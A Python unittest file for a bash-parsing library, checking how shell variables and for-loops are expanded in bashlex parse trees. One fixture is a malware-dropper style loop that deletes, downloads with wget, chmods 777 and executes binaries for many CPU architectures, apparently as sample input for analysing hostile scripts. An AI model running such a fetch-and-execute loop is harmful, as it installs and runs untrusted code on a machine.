from unittest import TestCase
from bashparse.variables import *
import bashlex

class TestVariables(TestCase):

    def test_update_trees_pos(self):
        self.assertRaises(ValueError, update_trees_pos, 'something', [], 0)
        self.assertRaises(ValueError, update_trees_pos, bashlex.parse('cd here')[0], 'something', 0)
        self.assertRaises(ValueError, update_trees_pos, bashlex.parse('cd here')[0], [], 'something')


    def test_update_command_substitution(self):
        self.assertRaises(ValueError, update_command_substitution, 'something')
    

    def test_replace_variables_using_paths(self):
        self.assertRaises(ValueError, replace_variables_using_paths, 'something', [], {})
        self.assertRaises(ValueError, replace_variables_using_paths, bashlex.parse('cd here')[0], 'something', {})
        self.assertRaises(ValueError, replace_variables_using_paths, bashlex.parse('cd here')[0], [], [])
    

    def test_substitute_variables(self):
        self.assertRaises(ValueError, substitute_variables, 'something', {})
        self.assertRaises(ValueError, substitute_variables, bashlex.parse('cd here')[0], [])
        # Testing for loops iterating over string, not variable
        test_str = 'for a in "one two three"\n do\n localgo\n cd $a\n done'
        for_node = bashlex.parse(test_str)[0]
        expected_results = [
            "CompoundNode(list=[ForNode(parts=[ReservedwordNode(pos=(0, 3) word='for'), WordNode(parts=[] pos=(4, 5) word='a'), ReservedwordNode(pos=(6, 8) word='in'), WordNode(parts=[] pos=(9, 24) word='one two three'), ReservedwordNode(pos=(26, 28) word='do'), ListNode(parts=[CommandNode(parts=[WordNode(parts=[] pos=(30, 37) word='localgo')] pos=(30, 37)), OperatorNode(op='\\n' pos=(37, 38)), CommandNode(parts=[WordNode(parts=[] pos=(39, 41) word='cd'), WordNode(parts=[] pos=(42, 45) word='one')] pos=(39, 45)), OperatorNode(op='\\n' pos=(45, 46))] pos=(30, 46)), ReservedwordNode(pos=(47, 51) word='done')] pos=(0, 51))] pos=(0, 51) redirects=[])",
            "CompoundNode(list=[ForNode(parts=[ReservedwordNode(pos=(0, 3) word='for'), WordNode(parts=[] pos=(4, 5) word='a'), ReservedwordNode(pos=(6, 8) word='in'), WordNode(parts=[] pos=(9, 24) word='one two three'), ReservedwordNode(pos=(26, 28) word='do'), ListNode(parts=[CommandNode(parts=[WordNode(parts=[] pos=(30, 37) word='localgo')] pos=(30, 37)), OperatorNode(op='\\n' pos=(37, 38)), CommandNode(parts=[WordNode(parts=[] pos=(39, 41) word='cd'), WordNode(parts=[] pos=(42, 45) word='two')] pos=(39, 45)), OperatorNode(op='\\n' pos=(45, 46))] pos=(30, 46)), ReservedwordNode(pos=(47, 51) word='done')] pos=(0, 51))] pos=(0, 51) redirects=[])", 
            "CompoundNode(list=[ForNode(parts=[ReservedwordNode(pos=(0, 3) word='for'), WordNode(parts=[] pos=(4, 5) word='a'), ReservedwordNode(pos=(6, 8) word='in'), WordNode(parts=[] pos=(9, 24) word='one two three'), ReservedwordNode(pos=(26, 28) word='do'), ListNode(parts=[CommandNode(parts=[WordNode(parts=[] pos=(30, 37) word='localgo')] pos=(30, 37)), OperatorNode(op='\\n' pos=(37, 38)), CommandNode(parts=[WordNode(parts=[] pos=(39, 41) word='cd'), WordNode(parts=[] pos=(42, 47) word='three')] pos=(39, 47)), OperatorNode(op='\\n' pos=(47, 48))] pos=(30, 48)), ReservedwordNode(pos=(49, 53) word='done')] pos=(0, 53))] pos=(0, 53) redirects=[])"
        ]
        replaced_nodes = substitute_variables(for_node, {})
        replaced_nodes = [str(x) for x in replaced_nodes]
        self.assertTrue(expected_results == replaced_nodes)

    def test_variable_replacement_functions(self):
        # This code actually tests substitute_variables, update_trees_pos, update_command_substitution, and replace variables
        # It does this using well formatted inputs. Makes my life a lot easier
        
        # Verify that simple replacement of variables works
        var_list = {'var': ['one', 'two']}
        nodes = bashlex.parse('testing=$var')
        replaced_nodes = substitute_variables(nodes[0], var_list)
        replaced_nodes = [str(x) for x in replaced_nodes]
        result_string = [
            "CommandNode(parts=[AssignmentNode(parts=[] pos=(0, 11) word='testing=one')] pos=(0, 11))",
            "CommandNode(parts=[AssignmentNode(parts=[] pos=(0, 11) word='testing=two')] pos=(0, 11))"
        ]
        self.assertTrue(result_string == replaced_nodes)
        # Verify that command substitutions and variable replacements in that command substitution work
        var_list = {'http_server':['dns.cyberium.cc']}
        for_node_command_substitution_str = \
            "for a in $(cd $http_server)\n do\n rm -rf this\n done"
        for_node_command_substitution_parsed = \
            "CompoundNode(list=[ForNode(parts=[ReservedwordNode(pos=(0, 3) word='for'), WordNode(parts=[] pos=(4, 5) word='a'), ReservedwordNode(pos=(6, 8) word='in'), WordNode(parts=[CommandsubstitutionNode(command=CommandNode(parts=[WordNode(parts=[] pos=(11, 13) word='cd'), WordNode(parts=[] pos=(14, 29) word='dns.cyberium.cc')] pos=(11, 29)) pos=(9, 30))] pos=(9, 30) word='$(cd dns.cyberium.cc)'), ReservedwordNode(pos=(32, 34) word='do'), CommandNode(parts=[WordNode(parts=[] pos=(36, 38) word='rm'), WordNode(parts=[] pos=(39, 42) word='-rf'), WordNode(parts=[] pos=(43, 47) word='this')] pos=(36, 47)), ReservedwordNode(pos=(49, 53) word='done')] pos=(0, 53))] pos=(0, 53) redirects=[])"
        nodes = bashlex.parse(for_node_command_substitution_str)
        results = substitute_variables(nodes[0], var_list)
        self.assertTrue(str(results[0]) == for_node_command_substitution_parsed)
        # Verify that a variable substitution will replace well and it will split into an array when necessary. Also lots of line breaks to make sure we can parse that
        for_loop_string_split = "for a in $n\n do\n\n rm -rf $a\n\n wget http://127.0.0.1/words/$a -O \n\n  chmod 777 $a\n ./$a ssh\n done"
        var_list = {'n':['arm arm5 arm4 arm6 arm7 m68k mips mipsel sparc sh4 x86_64 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa']}
        for_node = bashlex.parse(for_loop_string_split)[0].list[0]  # To actually strip out just the for loop part
        result_strings = [
            "ForNode(parts=[ReservedwordNode(pos=(0, 3) word='for'), WordNode(parts=[] pos=(4, 5) word='a'), ReservedwordNode(pos=(6, 8) word='in'), WordNode(parts=[] pos=(9, 100) word='arm arm5 arm4 arm6 arm7 m68k mips mipsel sparc sh4 x86_64 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'), ReservedwordNode(pos=(102, 104) word='do'), ListNode(parts=[CommandNode(parts=[WordNode(parts=[] pos=(107, 109) word='rm'), WordNode(parts=[] pos=(110, 113) word='-rf'), WordNode(parts=[] pos=(114, 117) word='arm')] pos=(107, 117)), OperatorNode(op='\\n' pos=(117, 118)), CommandNode(parts=[WordNode(parts=[] pos=(120, 124) word='wget'), WordNode(parts=[] pos=(125, 151) word='http://127.0.0.1/words/arm'), WordNode(parts=[] pos=(152, 154) word='-O')] pos=(120, 154)), OperatorNode(op='\\n' pos=(155, 156)), CommandNode(parts=[WordNode(parts=[] pos=(159, 164) word='chmod'), WordNode(parts=[] pos=(165, 168) word='777'), WordNode(parts=[] pos=(169, 172) word='arm')] pos=(159, 172)), OperatorNode(op='\\n' pos=(172, 173)), CommandNode(parts=[WordNode(parts=[] pos=(174, 179) word='./arm'), WordNode(parts=[] pos=(180, 183) word='ssh')] pos=(174, 183)), OperatorNode(op='\\n' pos=(183, 184))] pos=(107, 184)), ReservedwordNode(pos=(185, 189) word='done')] pos=(0, 189))",
            "ForNode(parts=[ReservedwordNode(pos=(0, 3) word='for'), WordNode(parts=[] pos=(4, 5) word='a'), ReservedwordNode(pos=(6, 8) word='in'), WordNode(parts=[] pos=(9, 100) word='arm arm5 arm4 arm6 arm7 m68k mips mipsel sparc sh4 x86_64 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'), ReservedwordNode(pos=(102, 104) word='do'), ListNode(parts=[CommandNode(parts=[WordNode(parts=[] pos=(107, 109) word='rm'), WordNode(parts=[] pos=(110, 113) word='-rf'), WordNode(parts=[] pos=(114, 118) word='arm5')] pos=(107, 118)), OperatorNode(op='\\n' pos=(118, 119)), CommandNode(parts=[WordNode(parts=[] pos=(121, 125) word='wget'), WordNode(parts=[] pos=(126, 153) word='http://127.0.0.1/words/arm5'), WordNode(parts=[] pos=(154, 156) word='-O')] pos=(121, 156)), OperatorNode(op='\\n' pos=(157, 158)), CommandNode(parts=[WordNode(parts=[] pos=(161, 166) word='chmod'), WordNode(parts=[] pos=(167, 170) word='777'), WordNode(parts=[] pos=(171, 175) word='arm5')] pos=(161, 175)), OperatorNode(op='\\n' pos=(175, 176)), CommandNode(parts=[WordNode(parts=[] pos=(177, 183) word='./arm5'), WordNode(parts=[] pos=(184, 187) word='ssh')] pos=(177, 187)), OperatorNode(op='\\n' pos=(187, 188))] pos=(107, 188)), ReservedwordNode(pos=(189, 193) word='done')] pos=(0, 193))",
            "ForNode(parts=[ReservedwordNode(pos=(0, 3) word='for'), WordNode(parts=[] pos=(4, 5) word='a'), ReservedwordNode(pos=(6, 8) word='in'), WordNode(parts=[] pos=(9, 100) word='arm arm5 arm4 arm6 arm7 m68k mips mipsel sparc sh4 x86_64 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'), ReservedwordNode(pos=(102, 104) word='do'), ListNode(parts=[CommandNode(parts=[WordNode(parts=[] pos=(107, 109) word='rm'), WordNode(parts=[] pos=(110, 113) word='-rf'), WordNode(parts=[] pos=(114, 118) word='arm4')] pos=(107, 118)), OperatorNode(op='\\n' pos=(118, 119)), CommandNode(parts=[WordNode(parts=[] pos=(121, 125) word='wget'), WordNode(parts=[] pos=(126, 153) word='http://127.0.0.1/words/arm4'), WordNode(parts=[] pos=(154, 156) word='-O')] pos=(121, 156)), OperatorNode(op='\\n' pos=(157, 158)), CommandNode(parts=[WordNode(parts=[] pos=(161, 166) word='chmod'), WordNode(parts=[] pos=(167, 170) word='777'), WordNode(parts=[] pos=(171, 175) word='arm4')] pos=(161, 175)), OperatorNode(op='\\n' pos=(175, 176)), CommandNode(parts=[WordNode(parts=[] pos=(177, 183) word='./arm4'), WordNode(parts=[] pos=(184, 187) word='ssh')] pos=(177, 187)), OperatorNode(op='\\n' pos=(187, 188))] pos=(107, 188)), ReservedwordNode(pos=(189, 193) word='done')] pos=(0, 193))",
            "ForNode(parts=[ReservedwordNode(pos=(0, 3) word='for'), WordNode(parts=[] pos=(4, 5) word='a'), ReservedwordNode(pos=(6, 8) word='in'), WordNode(parts=[] pos=(9, 100) word='arm arm5 arm4 arm6 arm7 m68k mips mipsel sparc sh4 x86_64 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'), ReservedwordNode(pos=(102, 104) word='do'), ListNode(parts=[CommandNode(parts=[WordNode(parts=[] pos=(107, 109) word='rm'), WordNode(parts=[] pos=(110, 113) word='-rf'), WordNode(parts=[] pos=(114, 118) word='arm6')] pos=(107, 118)), OperatorNode(op='\\n' pos=(118, 119)), CommandNode(parts=[WordNode(parts=[] pos=(121, 125) word='wget'), WordNode(parts=[] pos=(126, 153) word='http://127.0.0.1/words/arm6'), WordNode(parts=[] pos=(154, 156) word='-O')] pos=(121, 156)), OperatorNode(op='\\n' pos=(157, 158)), CommandNode(parts=[WordNode(parts=[] pos=(161, 166) word='chmod'), WordNode(parts=[] pos=(167, 170) word='777'), WordNode(parts=[] pos=(171, 175) word='arm6')] pos=(161, 175)), OperatorNode(op='\\n' pos=(175, 176)), CommandNode(parts=[WordNode(parts=[] pos=(177, 183) word='./arm6'), WordNode(parts=[] pos=(184, 187) word='ssh')] pos=(177, 187)), OperatorNode(op='\\n' pos=(187, 188))] pos=(107, 188)), ReservedwordNode(pos=(189, 193) word='done')] pos=(0, 193))",
            "ForNode(parts=[ReservedwordNode(pos=(0, 3) word='for'), WordNode(parts=[] pos=(4, 5) word='a'), ReservedwordNode(pos=(6, 8) word='in'), WordNode(parts=[] pos=(9, 100) word='arm arm5 arm4 arm6 arm7 m68k mips mipsel sparc sh4 x86_64 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'), ReservedwordNode(pos=(102, 104) word='do'), ListNode(parts=[CommandNode(parts=[WordNode(parts=[] pos=(107, 109) word='rm'), WordNode(parts=[] pos=(110, 113) word='-rf'), WordNode(parts=[] pos=(114, 118) word='arm7')] pos=(107, 118)), OperatorNode(op='\\n' pos=(118, 119)), CommandNode(parts=[WordNode(parts=[] pos=(121, 125) word='wget'), WordNode(parts=[] pos=(126, 153) word='http://127.0.0.1/words/arm7'), WordNode(parts=[] pos=(154, 156) word='-O')] pos=(121, 156)), OperatorNode(op='\\n' pos=(157, 158)), CommandNode(parts=[WordNode(parts=[] pos=(161, 166) word='chmod'), WordNode(parts=[] pos=(167, 170) word='777'), WordNode(parts=[] pos=(171, 175) word='arm7')] pos=(161, 175)), OperatorNode(op='\\n' pos=(175, 176)), CommandNode(parts=[WordNode(parts=[] pos=(177, 183) word='./arm7'), WordNode(parts=[] pos=(184, 187) word='ssh')] pos=(177, 187)), OperatorNode(op='\\n' pos=(187, 188))] pos=(107, 188)), ReservedwordNode(pos=(189, 193) word='done')] pos=(0, 193))",
            "ForNode(parts=[ReservedwordNode(pos=(0, 3) word='for'), WordNode(parts=[] pos=(4, 5) word='a'), ReservedwordNode(pos=(6, 8) word='in'), WordNode(parts=[] pos=(9, 100) word='arm arm5 arm4 arm6 arm7 m68k mips mipsel sparc sh4 x86_64 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'), ReservedwordNode(pos=(102, 104) word='do'), ListNode(parts=[CommandNode(parts=[WordNode(parts=[] pos=(107, 109) word='rm'), WordNode(parts=[] pos=(110, 113) word='-rf'), WordNode(parts=[] pos=(114, 118) word='m68k')] pos=(107, 118)), OperatorNode(op='\\n' pos=(118, 119)), CommandNode(parts=[WordNode(parts=[] pos=(121, 125) word='wget'), WordNode(parts=[] pos=(126, 153) word='http://127.0.0.1/words/m68k'), WordNode(parts=[] pos=(154, 156) word='-O')] pos=(121, 156)), OperatorNode(op='\\n' pos=(157, 158)), CommandNode(parts=[WordNode(parts=[] pos=(161, 166) word='chmod'), WordNode(parts=[] pos=(167, 170) word='777'), WordNode(parts=[] pos=(171, 175) word='m68k')] pos=(161, 175)), OperatorNode(op='\\n' pos=(175, 176)), CommandNode(parts=[WordNode(parts=[] pos=(177, 183) word='./m68k'), WordNode(parts=[] pos=(184, 187) word='ssh')] pos=(177, 187)), OperatorNode(op='\\n' pos=(187, 188))] pos=(107, 188)), ReservedwordNode(pos=(189, 193) word='done')] pos=(0, 193))",
            "ForNode(parts=[ReservedwordNode(pos=(0, 3) word='for'), WordNode(parts=[] pos=(4, 5) word='a'), ReservedwordNode(pos=(6, 8) word='in'), WordNode(parts=[] pos=(9, 100) word='arm arm5 arm4 arm6 arm7 m68k mips mipsel sparc sh4 x86_64 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'), ReservedwordNode(pos=(102, 104) word='do'), ListNode(parts=[CommandNode(parts=[WordNode(parts=[] pos=(107, 109) word='rm'), WordNode(parts=[] pos=(110, 113) word='-rf'), WordNode(parts=[] pos=(114, 118) word='mips')] pos=(107, 118)), OperatorNode(op='\\n' pos=(118, 119)), CommandNode(parts=[WordNode(parts=[] pos=(121, 125) word='wget'), WordNode(parts=[] pos=(126, 153) word='http://127.0.0.1/words/mips'), WordNode(parts=[] pos=(154, 156) word='-O')] pos=(121, 156)), OperatorNode(op='\\n' pos=(157, 158)), CommandNode(parts=[WordNode(parts=[] pos=(161, 166) word='chmod'), WordNode(parts=[] pos=(167, 170) word='777'), WordNode(parts=[] pos=(171, 175) word='mips')] pos=(161, 175)), OperatorNode(op='\\n' pos=(175, 176)), CommandNode(parts=[WordNode(parts=[] pos=(177, 183) word='./mips'), WordNode(parts=[] pos=(184, 187) word='ssh')] pos=(177, 187)), OperatorNode(op='\\n' pos=(187, 188))] pos=(107, 188)), ReservedwordNode(pos=(189, 193) word='done')] pos=(0, 193))",
            "ForNode(parts=[ReservedwordNode(pos=(0, 3) word='for'), WordNode(parts=[] pos=(4, 5) word='a'), ReservedwordNode(pos=(6, 8) word='in'), WordNode(parts=[] pos=(9, 100) word='arm arm5 arm4 arm6 arm7 m68k mips mipsel sparc sh4 x86_64 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'), ReservedwordNode(pos=(102, 104) word='do'), ListNode(parts=[CommandNode(parts=[WordNode(parts=[] pos=(107, 109) word='rm'), WordNode(parts=[] pos=(110, 113) word='-rf'), WordNode(parts=[] pos=(114, 120) word='mipsel')] pos=(107, 120)), OperatorNode(op='\\n' pos=(120, 121)), CommandNode(parts=[WordNode(parts=[] pos=(123, 127) word='wget'), WordNode(parts=[] pos=(128, 157) word='http://127.0.0.1/words/mipsel'), WordNode(parts=[] pos=(158, 160) word='-O')] pos=(123, 160)), OperatorNode(op='\\n' pos=(161, 162)), CommandNode(parts=[WordNode(parts=[] pos=(165, 170) word='chmod'), WordNode(parts=[] pos=(171, 174) word='777'), WordNode(parts=[] pos=(175, 181) word='mipsel')] pos=(165, 181)), OperatorNode(op='\\n' pos=(181, 182)), CommandNode(parts=[WordNode(parts=[] pos=(183, 191) word='./mipsel'), WordNode(parts=[] pos=(192, 195) word='ssh')] pos=(183, 195)), OperatorNode(op='\\n' pos=(195, 196))] pos=(107, 196)), ReservedwordNode(pos=(197, 201) word='done')] pos=(0, 201))",
            "ForNode(parts=[ReservedwordNode(pos=(0, 3) word='for'), WordNode(parts=[] pos=(4, 5) word='a'), ReservedwordNode(pos=(6, 8) word='in'), WordNode(parts=[] pos=(9, 100) word='arm arm5 arm4 arm6 arm7 m68k mips mipsel sparc sh4 x86_64 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'), ReservedwordNode(pos=(102, 104) word='do'), ListNode(parts=[CommandNode(parts=[WordNode(parts=[] pos=(107, 109) word='rm'), WordNode(parts=[] pos=(110, 113) word='-rf'), WordNode(parts=[] pos=(114, 119) word='sparc')] pos=(107, 119)), OperatorNode(op='\\n' pos=(119, 120)), CommandNode(parts=[WordNode(parts=[] pos=(122, 126) word='wget'), WordNode(parts=[] pos=(127, 155) word='http://127.0.0.1/words/sparc'), WordNode(parts=[] pos=(156, 158) word='-O')] pos=(122, 158)), OperatorNode(op='\\n' pos=(159, 160)), CommandNode(parts=[WordNode(parts=[] pos=(163, 168) word='chmod'), WordNode(parts=[] pos=(169, 172) word='777'), WordNode(parts=[] pos=(173, 178) word='sparc')] pos=(163, 178)), OperatorNode(op='\\n' pos=(178, 179)), CommandNode(parts=[WordNode(parts=[] pos=(180, 187) word='./sparc'), WordNode(parts=[] pos=(188, 191) word='ssh')] pos=(180, 191)), OperatorNode(op='\\n' pos=(191, 192))] pos=(107, 192)), ReservedwordNode(pos=(193, 197) word='done')] pos=(0, 197))", 
            "ForNode(parts=[ReservedwordNode(pos=(0, 3) word='for'), WordNode(parts=[] pos=(4, 5) word='a'), ReservedwordNode(pos=(6, 8) word='in'), WordNode(parts=[] pos=(9, 100) word='arm arm5 arm4 arm6 arm7 m68k mips mipsel sparc sh4 x86_64 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'), ReservedwordNode(pos=(102, 104) word='do'), ListNode(parts=[CommandNode(parts=[WordNode(parts=[] pos=(107, 109) word='rm'), WordNode(parts=[] pos=(110, 113) word='-rf'), WordNode(parts=[] pos=(114, 117) word='sh4')] pos=(107, 117)), OperatorNode(op='\\n' pos=(117, 118)), CommandNode(parts=[WordNode(parts=[] pos=(120, 124) word='wget'), WordNode(parts=[] pos=(125, 151) word='http://127.0.0.1/words/sh4'), WordNode(parts=[] pos=(152, 154) word='-O')] pos=(120, 154)), OperatorNode(op='\\n' pos=(155, 156)), CommandNode(parts=[WordNode(parts=[] pos=(159, 164) word='chmod'), WordNode(parts=[] pos=(165, 168) word='777'), WordNode(parts=[] pos=(169, 172) word='sh4')] pos=(159, 172)), OperatorNode(op='\\n' pos=(172, 173)), CommandNode(parts=[WordNode(parts=[] pos=(174, 179) word='./sh4'), WordNode(parts=[] pos=(180, 183) word='ssh')] pos=(174, 183)), OperatorNode(op='\\n' pos=(183, 184))] pos=(107, 184)), ReservedwordNode(pos=(185, 189) word='done')] pos=(0, 189))",
            "ForNode(parts=[ReservedwordNode(pos=(0, 3) word='for'), WordNode(parts=[] pos=(4, 5) word='a'), ReservedwordNode(pos=(6, 8) word='in'), WordNode(parts=[] pos=(9, 100) word='arm arm5 arm4 arm6 arm7 m68k mips mipsel sparc sh4 x86_64 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'), ReservedwordNode(pos=(102, 104) word='do'), ListNode(parts=[CommandNode(parts=[WordNode(parts=[] pos=(107, 109) word='rm'), WordNode(parts=[] pos=(110, 113) word='-rf'), WordNode(parts=[] pos=(114, 120) word='x86_64')] pos=(107, 120)), OperatorNode(op='\\n' pos=(120, 121)), CommandNode(parts=[WordNode(parts=[] pos=(123, 127) word='wget'), WordNode(parts=[] pos=(128, 157) word='http://127.0.0.1/words/x86_64'), WordNode(parts=[] pos=(158, 160) word='-O')] pos=(123, 160)), OperatorNode(op='\\n' pos=(161, 162)), CommandNode(parts=[WordNode(parts=[] pos=(165, 170) word='chmod'), WordNode(parts=[] pos=(171, 174) word='777'), WordNode(parts=[] pos=(175, 181) word='x86_64')] pos=(165, 181)), OperatorNode(op='\\n' pos=(181, 182)), CommandNode(parts=[WordNode(parts=[] pos=(183, 191) word='./x86_64'), WordNode(parts=[] pos=(192, 195) word='ssh')] pos=(183, 195)), OperatorNode(op='\\n' pos=(195, 196))] pos=(107, 196)), ReservedwordNode(pos=(197, 201) word='done')] pos=(0, 201))",
            "ForNode(parts=[ReservedwordNode(pos=(0, 3) word='for'), WordNode(parts=[] pos=(4, 5) word='a'), ReservedwordNode(pos=(6, 8) word='in'), WordNode(parts=[] pos=(9, 100) word='arm arm5 arm4 arm6 arm7 m68k mips mipsel sparc sh4 x86_64 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'), ReservedwordNode(pos=(102, 104) word='do'), ListNode(parts=[CommandNode(parts=[WordNode(parts=[] pos=(107, 109) word='rm'), WordNode(parts=[] pos=(110, 113) word='-rf'), WordNode(parts=[] pos=(114, 147) word='aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')] pos=(107, 147)), OperatorNode(op='\\n' pos=(147, 148)), CommandNode(parts=[WordNode(parts=[] pos=(150, 154) word='wget'), WordNode(parts=[] pos=(155, 211) word='http://127.0.0.1/words/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'), WordNode(parts=[] pos=(212, 214) word='-O')] pos=(150, 214)), OperatorNode(op='\\n' pos=(215, 216)), CommandNode(parts=[WordNode(parts=[] pos=(219, 224) word='chmod'), WordNode(parts=[] pos=(225, 228) word='777'), WordNode(parts=[] pos=(229, 262) word='aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')] pos=(219, 262)), OperatorNode(op='\\n' pos=(262, 263)), CommandNode(parts=[WordNode(parts=[] pos=(264, 299) word='./aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'), WordNode(parts=[] pos=(300, 303) word='ssh')] pos=(264, 303)), OperatorNode(op='\\n' pos=(303, 304))] pos=(107, 304)), ReservedwordNode(pos=(305, 309) word='done')] pos=(0, 309))"
        ]
        replaced_nodes = substitute_variables(for_node, var_list)
        replaced_nodes = [str(x) for x in replaced_nodes]
        self.assertTrue(replaced_nodes == result_strings)
        # Test that list nodes replaced and returned properly 
        nodes = bashlex.parse('n=1;a=2$n')
        result_strings = ["ListNode(parts=[CommandNode(parts=[AssignmentNode(parts=[] pos=(0, 3) word='n=1')] pos=(0, 3)), OperatorNode(op=';' pos=(3, 4)), CommandNode(parts=[AssignmentNode(parts=[] pos=(4, 8) word='a=21')] pos=(4, 8))] pos=(0, 8))"]
        replaced_nodes = substitute_variables(nodes[0], {})
        replaced_nodes = [str(x) for x in replaced_nodes]
        self.assertTrue(replaced_nodes == result_strings)

    def test_add_variable_to_list(self):
        # Enforce that var_list is a dict
        self.assertRaises(ValueError, add_variable_to_list, [], 'something', [1, 2, 3])
        # Make sure that adding entries works if value is not not a string
        new_var_list = {}
        new_var_list = add_variable_to_list(new_var_list, 'name1', 1)
        self.assertTrue(new_var_list == {'name1':['1']})
        # Make sure that adding entries works if value is an array of not string, 
        new_var_list = {}
        new_var_list = add_variable_to_list(new_var_list, 'name1', [1, 2])
        self.assertTrue(new_var_list == {'name1':['1', '2']})
        # Make sure that adding entries works if value is str but not list
        new_var_list = {}
        new_var_list = add_variable_to_list(new_var_list, 'name1', 'value1')
        self.assertTrue(new_var_list == {'name1':['value1']})
        # Make sure adding non-list values works
        new_var_list = add_variable_to_list(new_var_list, 'name1', 'value2')
        self.assertTrue(new_var_list == {'name1':['value1', 'value2']})
        # Make sure that adding list values works
        new_var_list = add_variable_to_list(new_var_list, 'name1', ['value3', 'value4', 'value5'])
        self.assertTrue(new_var_list == {'name1':['value1', 'value2', 'value3', 'value4', 'value5']})
    

    def test_update_variable_list_with_node(self):
        node = bashlex.parse('a=b')[0]
        self.assertRaises(ValueError, update_variable_list_with_node, 'anything', {})
        self.assertRaises(ValueError, update_variable_list_with_node, node, [])
        # Test basic assignment gets saved
        mv_node = bashlex.parse('a=b')[0]
        new_var_list = update_variable_list_with_node(mv_node, {})
        self.assertTrue(new_var_list == {'a':['b']})  # Note that it should add mv_list automatically
        # Test command substitution assignment works fine
        mv_node = bashlex.parse('a=$(echo this)')[0]
        new_var_list = update_variable_list_with_node(mv_node, {})
        self.assertTrue(new_var_list == {'a':['$(echo this)']})  # Note that it should add mv_list automatically
        # Test that for loops work
        for_node = bashlex.parse('for a in "one two three"\n do\n echo something\n done')[0].list[0]
        new_var_list = update_variable_list_with_node(for_node, {})
        self.assertTrue(new_var_list == {'a':['one', 'two', 'three']})
        # Test for loops work with variable replacement
        for_node = bashlex.parse('for a in "$n"\n do\n echo something\n done')[0].list[0]
        new_var_list = update_var_list_with_for_loop(for_node, {'n':['one two three']})
        self.assertTrue(new_var_list == {'n':['one two three'], 'a':['one', 'two', 'three']})
        # Test for loops work with command substitution
        for_node = bashlex.parse('for a in "$(echo this)"\n do\n echo something\n done')[0].list[0]
        new_var_list = update_var_list_with_for_loop(for_node, {})
        self.assertTrue(new_var_list == {'a':['$(echo this)']})
    

    def test_update_var_list_with_for_loop(self):
        # Test that for loops work
        for_node = bashlex.parse('for a in "one two three"\n do\n echo something\n done')[0].list[0]
        new_var_list = update_variable_list_with_node(for_node, {})
        self.assertTrue(new_var_list == {'a':['one', 'two', 'three']})
        # Test for loops work with variable replacement
        for_node = bashlex.parse('for a in "$n"\n do\n echo something\n done')[0].list[0]
        new_var_list = update_var_list_with_for_loop(for_node, {'n':['one two three']})
        self.assertTrue(new_var_list == {'n':['one two three'], 'a':['one', 'two', 'three']})
        # Test for loops work with command substitution
        for_node = bashlex.parse('for a in "$(echo this)"\n do\n echo something\n done')[0].list[0]
        new_var_list = update_var_list_with_for_loop(for_node, {})
        self.assertTrue(new_var_list == {'a':['$(echo this)']})
        # Testing iterating over str, not variable

    
    def test_find_and_replace_variables(self):
        
        test_node = "n='one two three';\n for a in $n\n do\n cd $a; done"
        nodes = bashlex.parse(test_node)
        expected_results = [
            "ListNode(parts=[CommandNode(parts=[AssignmentNode(parts=[] pos=(0, 17) word='n=one two three')] pos=(0, 17)), OperatorNode(op=';' pos=(17, 18))] pos=(0, 18))",
            "CompoundNode(list=[ForNode(parts=[ReservedwordNode(pos=(20, 23) word='for'), WordNode(parts=[] pos=(24, 25) word='a'), ReservedwordNode(pos=(26, 28) word='in'), WordNode(parts=[] pos=(29, 42) word='one two three'), ReservedwordNode(pos=(44, 46) word='do'), ListNode(parts=[CommandNode(parts=[WordNode(parts=[] pos=(48, 50) word='cd'), WordNode(parts=[] pos=(51, 54) word='one')] pos=(48, 54)), OperatorNode(op=';' pos=(54, 55))] pos=(48, 55)), ReservedwordNode(pos=(56, 60) word='done')] pos=(20, 60))] pos=(20, 60) redirects=[])",
            "CompoundNode(list=[ForNode(parts=[ReservedwordNode(pos=(20, 23) word='for'), WordNode(parts=[] pos=(24, 25) word='a'), ReservedwordNode(pos=(26, 28) word='in'), WordNode(parts=[] pos=(29, 42) word='one two three'), ReservedwordNode(pos=(44, 46) word='do'), ListNode(parts=[CommandNode(parts=[WordNode(parts=[] pos=(48, 50) word='cd'), WordNode(parts=[] pos=(51, 54) word='two')] pos=(48, 54)), OperatorNode(op=';' pos=(54, 55))] pos=(48, 55)), ReservedwordNode(pos=(56, 60) word='done')] pos=(20, 60))] pos=(20, 60) redirects=[])",
            "CompoundNode(list=[ForNode(parts=[ReservedwordNode(pos=(20, 23) word='for'), WordNode(parts=[] pos=(24, 25) word='a'), ReservedwordNode(pos=(26, 28) word='in'), WordNode(parts=[] pos=(29, 42) word='one two three'), ReservedwordNode(pos=(44, 46) word='do'), ListNode(parts=[CommandNode(parts=[WordNode(parts=[] pos=(48, 50) word='cd'), WordNode(parts=[] pos=(51, 56) word='three')] pos=(48, 56)), OperatorNode(op=';' pos=(56, 57))] pos=(48, 57)), ReservedwordNode(pos=(58, 62) word='done')] pos=(20, 62))] pos=(20, 62) redirects=[])"
        ]
        replaced_nodes = find_and_replace_variables(nodes)
        for i in range(0, len(replaced_nodes)):
            self.assertTrue(str(replaced_nodes[i]) == expected_results[i])
















